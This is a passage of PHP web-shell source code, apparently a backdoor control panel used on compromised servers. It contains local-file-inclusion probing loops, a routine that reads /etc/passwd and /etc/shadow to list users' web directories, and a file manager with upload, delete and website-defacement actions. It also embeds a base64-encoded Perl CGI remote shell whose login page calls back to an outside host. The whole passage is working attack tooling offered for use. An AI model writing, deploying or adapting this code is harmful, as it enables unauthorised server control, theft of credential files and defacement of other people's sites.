                    $res3 = FetchURL($target.$lfimysql[$x]);
                    $rhash3 = md5($res3);
                    if ($rhash3 != $rhash2) {
                    print "<font color='green'>[+] File detected!</font> <a href=\"".$target."".$lfimysql[$x]."\">".$target."".$lfimysql[$x]."</a><br  />";
                    }
                    else {            
                                  print "<font color='red'>[!] Failed!</font>".$target."".$lfimysql[$x]."<br  />";
                    }
                    $x++;
          }
          }
             }
             if ( $type == 6 ) {
                $res1 = FetchURL($target.$lfitest);
                $res2 = FetchURL($target.$lfitest2);
                $rhash1 = md5($res1);
                $rhash2 = md5($res2);
                if ($rhash1 != $rhash2) {
                    print "<font color='green'>[+] Exploitable!</font> <a href=\"".$target."".$lfitest."\">".$target."".$lfitest."</a><br  />";
                while($lfiftp[$x]) {
                    $res3 = FetchURL($target.$lfiftp[$x]);
                    $rhash3 = md5($res3);
                    if ($rhash3 != $rhash2) {
                    print "<font color='green'>[+] File detected!</font> <a href=\"".$target."".$lfiftp[$x]."\">".$target."".$lfiftp[$x]."</a><br  />";
                    }
                    else {            
                                  print "<font color='red'>[!] Failed!</font>".$target."".$lfiftp[$x]."<br  />";
                    }
                    $x++;
          }
          }
             }
    if ( $type == 7 ) {
                $res1 = FetchURL($target.$lfitest);
                $res2 = FetchURL($target.$lfitest2);
                $rhash1 = md5($res1);
                $rhash2 = md5($res2);
                if ($rhash1 != $rhash2) {
                    print "<font color='green'>[+] Exploitable!</font> <a href=\"".$target."".$lfitest."\">".$target."".$lfitest."</a><br  />";{
                    $res3 = FetchURL($target.$lfiprocenv);
                    $rhash3 = md5($res3);
                    if ($rhash3 != $rhash2) {
                    print "<font color='green'>[+] File detected!</font> <a href=\"".$target."".$lfiprocenv."\">".$target."".$lfiprocenv."</a><br  />";
                    }
                    else {            
                                  print "<font color='red'>[!] Failed!</font>".$target."".$lfiprocenv."<br  />";
                    }
          }
          }
             }
          }
    printFooter();
    }
    
function actionReadable() {
    printHeader();
    echo '<h1>Readable Dirs</h1>';
    echo '<div class="content">';
    $sm = ini_get('safe_mode');
    if($sm) {
        echo '<br /><b>Error: safe_mode = on</b><br /><br />';
    } else {
        @$passwd = file('/etc/passwd','r');
        @$passwd = file('/etc/shadow','r');
        if (!$passwd) { 
            echo '<br /><b> [-] Error : coudn`t read /etc/passwd or /etc/shadow </b><br /><br />'; 
        } else {
            $pub = array();
            $users = array();
            $conf = array();
            $i = 0;
            foreach($passwd as $p) {
                $r = explode(':',$p);
                $dirz = $r[5].'/public_html/';
                if(strpos($r[5],'home')) {
                    array_push($users,$r[0]);
                    if (is_readable($dirz)) {
                        array_push($pub,$dirz);
                    }
                }
            }
            echo '<br><br>';
            echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n"."<br />";
            echo "[+] Founded ".sizeof($pub)." readable public_html directories\n"."<br /><br /><br />";
            foreach ($pub as $user) {
                echo $user."<br>";
            }
            echo "<br /><br /><br />[+] Complete...\n"."<br />";
        }
    }
    echo '</div>';
    printFooter();    
}   

function actionFilesMan() {
    printHeader();
    echo '<h1>File manager</h1><div class=content>';
    if(isset($_POST['p1']) && $_POST['p1']!='deface') {
        switch($_POST['p1']) {
            case 'uploadFile':
                if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))
                    echo "Can't upload file!";
                break;
                break;
            case 'mkdir':
                if(!@mkdir($_POST['p2']))
                    echo "Can't create new dir";
                break;
            case 'delete':
                function deleteDir($path) {
                    $path = (substr($path,-1)=='/') ? $path:$path.'/';
                    $dh  = opendir($path);
                    while ( ($item = readdir($dh) ) !== false) {
                        $item = $path.$item;
                        if ( (basename($item) == "..") || (basename($item) == ".") )
                            continue;
                        $type = filetype($item);
                        if ($type == "dir")
                            deleteDir($item);
                        else
                            @unlink($item);
                    }
                    closedir($dh);
                    rmdir($path);
                }
                if(is_array(@$_POST['f']))
                    foreach($_POST['f'] as $f) {
                        $f = urldecode($f);
                        if(is_dir($f))
                            deleteDir($f);
                        else
                            @unlink($f);
                    }
                break;
            case 'paste':
                if($_SESSION['act'] == 'copy') {
                    function copy_paste($c,$s,$d){
                        if(is_dir($c.$s)){
                            mkdir($d.$s);
                            $h = opendir($c.$s);
                            while (($f = readdir($h)) !== false)
                                if (($f != ".") and ($f != "..")) {
                                    copy_paste($c.$s.'/',$f, $d.$s.'/');
                                }
                        } elseif(is_file($c.$s)) {
                            @copy($c.$s, $d.$s);
                        }
                    }
                    foreach($_SESSION['f'] as $f)
                        copy_paste($_SESSION['cwd'],$f, $GLOBALS['cwd']);                    
                } elseif($_SESSION['act'] == 'move') {
                    function move_paste($c,$s,$d){
                        if(is_dir($c.$s)){
                            mkdir($d.$s);
                            $h = opendir($c.$s);
                            while (($f = readdir($h)) !== false)
                                if (($f != ".") and ($f != "..")) {
                                    copy_paste($c.$s.'/',$f, $d.$s.'/');
                                }
                        } elseif(is_file($c.$s)) {
                            @copy($c.$s, $d.$s);
                        }
                    }
                    foreach($_SESSION['f'] as $f)
                        @rename($_SESSION['cwd'].$f, $GLOBALS['cwd'].$f);
                }
                unset($_SESSION['f']);
                break;
            default:
                if(!empty($_POST['p1']) && (($_POST['p1'] == 'copy')||($_POST['p1'] == 'move')) ) {
                    $_SESSION['act'] = @$_POST['p1'];
                    $_SESSION['f'] = @$_POST['f'];
                    foreach($_SESSION['f'] as $k => $f)
                        $_SESSION['f'][$k] = urldecode($f);
                    $_SESSION['cwd'] = @$_POST['c'];
                }
                break;
        }
        echo '<script>document.mf.p1.value="";document.mf.p2.value="";</script>';
    }
    if(isset($_POST['p1']) && $_POST['p1']=='deface') {
        $def = file_get_contents(''); //DEFACE LINK HERE 
        file_put_contents($_POST['c'].$_POST['p2'],$def);
    }
    $dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
    if($dirContent === false) {    echo 'Can\'t open this folder!'; return;    }
    global $sort;
    $sort = array('name', 1);
    if(!empty($_POST['p1'])) {
        if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
            $sort = array($match[1], (int)$match[2]);
    }
    echo '<script>
        function sa() {
            for(i=0;i<document.files.elements.length;i++)
            if(document.files.elements[i].type == \'checkbox\')
                document.files.elements[i].checked = document.files.elements[0].checked;
        }
        </script>
        <table width=\'100%\' class=\'main\' cellspacing=\'0\' cellpadding=\'2\'>
        <form name=files method=post>';
    echo "<tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
    $dirs = $files = $links = array();
    $n = count($dirContent);
    for($i=0;$i<$n;$i++) {
        $ow = @posix_getpwuid(@fileowner($dirContent[$i]));
        $gr = @posix_getgrgid(@filegroup($dirContent[$i]));
        $tmp = array('name' => $dirContent[$i],
                     'path' => $GLOBALS['cwd'].$dirContent[$i],
                     'modify' => @date('Y-m-d H:i:s',@filemtime($GLOBALS['cwd'].$dirContent[$i])),
                     'perms' => viewPermsColor($GLOBALS['cwd'].$dirContent[$i]),
                     'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
                     'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
                     'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
                    );
        if(@is_file($GLOBALS['cwd'].$dirContent[$i]))
            $files[] = array_merge($tmp, array('type' => 'file'));
        elseif(@is_link($GLOBALS['cwd'].$dirContent[$i]))
            $links[] = array_merge($tmp, array('type' => 'link'));
        elseif(@is_dir($GLOBALS['cwd'].$dirContent[$i])&& ($dirContent[$i] != "."))
            $dirs[] = array_merge($tmp, array('type' => 'dir'));
    }
    $GLOBALS['sort'] = $sort;
    function cmp($a, $b) {
        if($GLOBALS['sort'][0] != 'size')
            return strcmp($a[$GLOBALS['sort'][0]], $b[$GLOBALS['sort'][0]])*($GLOBALS['sort'][1]?1:-1);
        else
            return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
    }
    usort($files, "cmp");
    usort($dirs, "cmp");
    usort($links, "cmp");
    $files = array_merge($dirs, $links, $files);
    $l = 0;
    foreach($files as $f) {
        echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');"><b>[ '.htmlspecialchars($f['name']).' ]</b>').'</a></td><td>'.(($f['type']=='file')?viewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
            .'</td><td><a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>';
        $l = $l?0:1;
    }
    echo '<tr><td colspan=5>
    <input type=hidden name=a value=\'FilesMan\'>
    <input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">
    <input type=hidden name=charset value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
    <select name=\'p1\'><option value=\'copy\'>Copy</option><option value=\'move\'>Move</option><option value=\'delete\'>Delete</option>';
    if(!empty($_SESSION['act'])&&@count($_SESSION['f'])){echo '<option value=\'paste\'>Paste</option>'; }
    echo '</select>&nbsp;<input type="submit" value="Submit"></td><td colspan="2" align="right" width="1"><input name="def" id="def" value="index.html" size="10"/>&nbsp;<input type="button" onclick="g(\'FilesMan\',\''.htmlspecialchars($GLOBALS['cwd']).'\',\'deface\',document.getElementById(\'def\').value)" value="Add Deface Here"></td></tr>
    </form></table></div>';
    printFooter();
}


function actionCgiShell() {
                                                                    printHeader();
                                                                    echo '<h1>Cgi telnet Evil here </h1><div class=content>';
                                                                    mkdir('cgitelnet1', 0755);
                                                                    chdir('cgitelnet1');
                                                                    $kokdosya = ".htaccess";
                                                                    $dosya_adi = "$kokdosya";
                                                                    $dosya = fopen($dosya_adi, 'w') or die("Dosya a&#231;&#305;lamad&#305;!");
                                                                    $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";
                                                                    fwrite($dosya, $metin);
                                                                    fclose($dosya);
                                                                    $cgishellizocin = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbg0KIy0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLQ0KIyA8YiBzdHlsZT0iY29sb3I6YmxhY2s7YmFja2dyb3VuZC1jb2xvcjojZmZmZjY2Ij5w
cml2OCBjZ2kgc2hlbGw8L2I+ICMgc2VydmVyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiMt
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQ29uZmlndXJhdGlvbjogWW91IG5lZWQgdG8gY2hhbmdl
IG9ubHkgJFBhc3N3b3JkIGFuZCAkV2luTlQuIFRoZSBvdGhlcg0KIyB2YWx1ZXMgc2hvdWxkIHdv
cmsgZmluZSBmb3IgbW9zdCBzeXN0ZW1zLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KJFBhc3N3
b3JkID0gInByaXY4IjsJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhp
cw0KCQkJCSMgdG8gbG9naW4uDQoNCiRXaW5OVCA9IDA7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2Ug
dGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZg0KCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3Jp
cHQgb24gYSBXaW5kb3dzIE5UDQoJCQkJIyBtYWNoaW5lLiBJZiB5b3UncmUgcnVubmluZyBpdCBv
biBVbml4LCB5b3UNCgkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuDQoNCiROVENt
ZFNlcCA9ICImIjsJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1h
bmRzDQoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULg0KDQokVW5peENtZFNl
cCA9ICI7IjsJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRz
DQoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4Lg0KDQokQ29tbWFuZFRpbWVvdXREdXJh
dGlvbiA9IDEwOwkjIFRpbWUgaW4gc2Vjb25kcyBhZnRlciBjb21tYW5kcyB3aWxsIGJlIGtpbGxl
ZA0KCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzDQoJ
CQkJIyB1c2VmdWwgZm9yIGNvbW1hbmRzIHRoYXQgbWF5IGhhbmcgb3IgdGhhdA0KCQkJCSMgdGFr
ZSB2ZXJ5IGxvbmcgdG8gZXhlY3V0ZSwgbGlrZSAiZmluZCAvIi4NCgkJCQkjIFRoaXMgaXMgdmFs
aWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzDQoJCQkJIyBpZ25vcmVkIG9uIE5UIFNlcnZl
cnMuDQoNCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRh
IGlzIHNlbnQgdG8gdGhlDQoJCQkJIyBicm93c2VyIGFzIHNvb24gYXMgaXQgaXMgb3V0cHV0LCBv
dGhlcndpc2UNCgkJCQkjIGl0IGlzIGJ1ZmZlcmVkIGFuZCBzZW5kIHdoZW4gdGhlIGNvbW1hbmQN
CgkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UNCgkJCQkj
IHBpbmcsIHNvIHRoYXQgeW91IGNhbiBzZWUgdGhlIG91dHB1dCBhcyBpdA0KCQkJCSMgaXMgYmVp
bmcgZ2VuZXJhdGVkLg0KDQojIERPTidUIENIQU5HRSBBTllUSElORyBCRUxPVyBUSElTIExJTkUg
VU5MRVNTIFlPVSBLTk9XIFdIQVQgWU9VJ1JFIERPSU5HICEhDQoNCiRDbWRTZXAgPSAoJFdpbk5U
ID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDog
InB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9
ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0KDQojLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tDQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJz
ZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQNCiMgcGFyc2VzIEdFVCwgUE9TVCBhbmQgbXVsdGlw
YXJ0L2Zvcm0tZGF0YSB0aGF0IGlzIHVzZWQgZm9yIHVwbG9hZGluZyBmaWxlcy4NCiMgVGhlIGZp
bGVuYW1lIGlzIHN0b3JlZCBpbiAkaW57J2YnfSBhbmQgdGhlIGRhdGEgaXMgc3RvcmVkIGluICRp
bnsnZmlsZWRhdGEnfS4NCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAk
aW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YNCiMgdGhlIHZhcmlhYmxlLiBOb3Rl
OiBNb3N0IG9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4gZnJvbSBvdGhlciBD
R0kNCiMgc2NyaXB0cy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBSZWFkUGFyc2UgDQp7
DQoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwp
Ow0KCQ0KCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0
aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KDQoJaWYoJEVOVnsnUkVRVUVTVF9N
RVRIT0QnfSBlcSAiR0VUIikNCgl7DQoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KCX0N
CgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCgl7DQoJCWJpbm1vZGUo
U1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCgkJcmVhZChTVERJTiwgJGlu
LCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCgl9DQoNCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBk
YXRhDQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBi
b3VuZGFyeT0oLispJC8pDQoJew0KCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZl
ciB0byBSRkMxODY3IA0KCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyANCgkJJEhl
YWRlckJvZHkgPSAkbGlzdFsxXTsNCgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0K
CQkkSGVhZGVyID0gJGA7DQoJCSRCb2R5ID0gJCc7DQogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMg
dGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlDQoJCSRpbnsnZmlsZWRhdGEnfSA9
ICRCb2R5Ow0KCQkkSGVhZGVyID1+IC9maWxlbmFtZT1cIiguKylcIi87IA0KCQkkaW57J2YnfSA9
ICQxOyANCgkJJGlueydmJ30gPX4gcy9cIi8vZzsNCgkJJGlueydmJ30gPX4gcy9ccy8vZzsNCg0K
CQkjIHBhcnNlIHRyYWlsZXINCgkJZm9yKCRpPTI7ICRsaXN0WyRpXTsgJGkrKykNCgkJeyANCgkJ
CSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KCQkJJGxpc3RbJGldID1+IC9cIihcdyspXCIv
Ow0KCQkJJGtleSA9ICQxOw0KCQkJJHZhbCA9ICQnOw0KCQkJJHZhbCA9fiBzLyheKFxyXG5cclxu
fFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4
KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gPSAkdmFsOyANCgkJfQ0KCX0NCgllbHNlICMgc3RhbmRh
cmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkNCgl7DQoJCUBpbiA9IHNw
bGl0KC8mLywgJGluKTsNCgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQ0KCQl7DQoJCQkkaW5bJGld
ID1+IHMvXCsvIC9nOw0KCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsN
CgkJCSRrZXkgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkdmFsID1+IHMv
JSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRl
ZmluZWQoJGlueyRrZXl9KSk7DQoJCQkkaW57JGtleX0gLj0gJHZhbDsNCgkJfQ0KCX0NCn0NCg0K
Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgUGFnZSBIZWFkZXINCiMg
QXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldA0K
Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KCSRFbmNvZGVk
Q3VycmVudERpciA9ICRDdXJyZW50RGlyOw0KCSRFbmNvZGVkQ3VycmVudERpciA9fiBzLyhbXmEt
ekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJcHJpbnQgIkNvbnRlbnQtdHlwZTog
dGV4dC9odG1sXG5cbiI7DQoJcHJpbnQgPDxFTkQ7DQo8aHRtbD4NCjxoZWFkPg0KPHRpdGxlPnBy
aXY4IGNnaSBzaGVsbDwvdGl0bGU+DQokSHRtbE1ldGFIZWFkZXINCg0KPG1ldGEgbmFtZT0ia2V5
d29yZHMiIGNvbnRlbnQ9InByaXY4IGNnaSBzaGVsbCAgXyAgICAgaTVfQGhvdG1haWwuY29tIj4N
CjxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJwcml2OCBjZ2kgc2hlbGwgIF8gICAg
aTVfQGhvdG1haWwuY29tIj4NCjwvaGVhZD4NCjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5m
b2N1cygpIiBiZ2NvbG9yPSIjRkZGRkZGIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1h
cmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiIHRleHQ9IiNGRjAwMDAiPg0KPHRhYmxlIGJv
cmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+DQo8
dHI+DQo8dGQgYmdjb2xvcj0iI0ZGRkZGRiIgYm9yZGVyY29sb3I9IiNGRkZGRkYiIGFsaWduPSJj
ZW50ZXIiIHdpZHRoPSIxJSI+DQo8Yj48Zm9udCBzaXplPSIyIj4jPC9mb250PjwvYj48L3RkPg0K
PHRkIGJnY29sb3I9IiNGRkZGRkYiIHdpZHRoPSI5OCUiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNp
emU9IjIiPjxiPiANCjxiIHN0eWxlPSJjb2xvcjpibGFjaztiYWNrZ3JvdW5kLWNvbG9yOiNmZmZm
NjYiPnByaXY4IGNnaSBzaGVsbDwvYj4gQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPC9iPjwvZm9u
dD48L3RkPg0KPC90cj4NCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIiBiZ2NvbG9yPSIjRkZGRkZGIj48
Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4NCg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9u
P2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+VXBs
b2FkIEZpbGU8L2ZvbnQ+PC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxv
YWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPjxmb250IGNvbG9yPSIjRkYwMDAwIj5Eb3dubG9hZCBG
aWxlPC9mb250PjwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij48Zm9u
dCBjb2xvcj0iI0ZGMDAwMCI+RGlzY29ubmVjdDwvZm9udD48L2E+IHwNCjwvZm9udD48L3RkPg0K
PC90cj4NCjwvdGFibGU+DQo8Zm9udCBzaXplPSIzIj4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tDQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuDQojLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KCSRNZXNzYWdlID0gcSQ8L2ZvbnQ+PGgxPnBh
c3M9cHJpdjg8L2gxPjxmb250IGNvbG9yPSIjMDA5OTAwIiBzaXplPSIzIj48cHJlPjxpbWcgYm9y
ZGVyPSIwIiBzcmM9Imh0dHA6Ly93d3cucHJpdjguaWJsb2dnZXIub3JnL3MucGhwPytjZ2l0ZWxu
ZXQgc2hlbGwiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiPjwvcHJlPg0KJDsNCiMnDQoJcHJpbnQgPDxF
TkQ7DQo8Y29kZT4NCg0KVHJ5aW5nICRTZXJ2ZXJOYW1lLi4uPGJyPg0KQ29ubmVjdGVkIHRvICRT
ZXJ2ZXJOYW1lPGJyPg0KRXNjYXBlIGNoYXJhY3RlciBpcyBeXQ0KPGNvZGU+JE1lc3NhZ2UNCkVO
RA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0
IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0NCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQ0Kew0KCXByaW50IDw8RU5EOw0KPGNvZGU+
DQo8YnI+bG9naW46IGFkbWluPGJyPg0KcGFzc3dvcmQ6PGJyPg0KTG9naW4gaW5jb3JyZWN0PGJy
Pjxicj4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50
cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpz
dWIgUHJpbnRMb2dpbkZvcm0NCnsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KDQo8Zm9ybSBuYW1l
PSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCjxpbnB1dCB0eXBl
PSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+DQo8L2ZvbnQ+DQo8Zm9udCBzaXplPSIz
Ij4NCmxvZ2luOiA8YiBzdHlsZT0iY29sb3I6YmxhY2s7YmFja2dyb3VuZC1jb2xvcjojZmZmZjY2
Ij5wcml2OCBjZ2kgc2hlbGw8L2I+PGJyPg0KcGFzc3dvcmQ6PC9mb250Pjxmb250IGNvbG9yPSIj
MDA5OTAwIiBzaXplPSIzIj48aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InAiPg0KPGlucHV0
IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0K
DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
